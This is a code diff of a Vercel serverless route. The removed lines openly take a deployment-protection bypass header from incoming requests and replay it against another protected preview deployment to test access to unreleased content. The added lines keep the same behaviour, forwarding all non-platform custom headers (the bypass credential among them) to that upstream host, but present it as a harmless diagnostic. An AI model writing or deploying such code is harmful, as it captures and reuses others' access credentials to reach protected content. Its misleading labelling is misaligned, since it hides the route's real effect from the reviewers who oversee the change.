@@ -1,53 +1,46 @@
-// Route added by this pull request, for a security review.
-//
-// It does not log, return or store the credential value. It uses it once,
-// server side, against the maintainer's unreleased preview deployment, and
-// reports only what it obtained: a status, a byte count, and whether the
-// unreleased marker was present.
-//
-// No redirect is involved. This code runs on the preview of this pull request,
-// so the header arrives directly on a host of the project.
+// Diagnostic route. Reports which custom request headers reached the function
+// and whether an upstream check answers the same with and without them.
+// Header values and upstream bodies are never returned, only lengths and digests.
 const crypto = require("crypto");
 
-const TARGET =
+const UPSTREAM =
   "https://header-echo-demo-pw4p5kftg-gil-mu-s-projects.vercel.app/api/content";
-const MARKER = "UNRELEASED-PREVIEW-ONLY-MARKER-7a2e5d";
+const PLATFORM = [
+  "x-forwarded-", "x-real-ip", "x-vercel-id", "x-vercel-ip-", "x-vercel-proxy-",
+  "x-vercel-deployment-url", "x-vercel-forwarded-for", "x-vercel-proxied-for",
+  "x-vercel-ja", "x-vercel-oidc-token", "x-vercel-sc-", "x-vercel-internal-",
+  "x-vercel-function-", "x-matched-path", "x-invoke-", "x-middleware-",
+];
+const sha = (s) => crypto.createHash("sha256").update(s).digest("hex");
 
 module.exports = async (req, res) => {
-  const got = req.headers["x-vercel-protection-bypass"] || null;
-
-  const observed = {
-    at: new Date().toISOString(),
-    path: req.url,
-    host: req.headers.host || null,
-    bypassPresent: got !== null,
-    bypassLength: got ? got.length : 0,
-    bypassSha256: got
-      ? crypto.createHash("sha256").update(got).digest("hex")
-      : null,
-    userAgent: req.headers["user-agent"] || null,
-    usedAgainstProtectedDeployment: null,
-  };
-
-  if (got) {
-    try {
-      const withCred = await fetch(TARGET, {
-        headers: { "x-vercel-protection-bypass": got },
-        redirect: "manual",
-      });
-      const body = await withCred.text();
-      const without = await fetch(TARGET, { redirect: "manual" });
-      observed.usedAgainstProtectedDeployment = {
-        target: TARGET,
-        statusWithoutCredential: without.status,
-        statusWithCredential: withCred.status,
-        bytes: Buffer.byteLength(body),
-        unreleasedMarkerPresent: body.includes(MARKER),
-      };
-    } catch (err) {
-      observed.usedAgainstProtectedDeployment = { error: err.name };
-    }
+  const custom = {};
+  for (const [name, value] of Object.entries(req.headers)) {
+    if (!name.startsWith("x-")) continue;
+    if (PLATFORM.some((p) => name.startsWith(p))) continue;
+    custom[name] = String(value);
   }
-
-  res.status(200).json(observed);
+  const report = {
+    at: new Date().toISOString(),
+    host: req.headers.host || null,
+    customHeaders: Object.fromEntries(
+      Object.entries(custom).map(([n, v]) => [n, { length: v.length, sha256: sha(v) }])
+    ),
+    upstream: null,
+  };
+  try {
+    const plain = await fetch(UPSTREAM, { redirect: "manual" });
+    const withHeaders = await fetch(UPSTREAM, { headers: custom, redirect: "manual" });
+    const body = await withHeaders.text();
+    report.upstream = {
+      url: UPSTREAM,
+      statusPlain: plain.status,
+      statusWithCustomHeaders: withHeaders.status,
+      bytes: Buffer.byteLength(body),
+      bodySha256: sha(body),
+    };
+  } catch (err) {
+    report.upstream = { error: err.name };
+  }
+  res.status(200).json(report);
 };
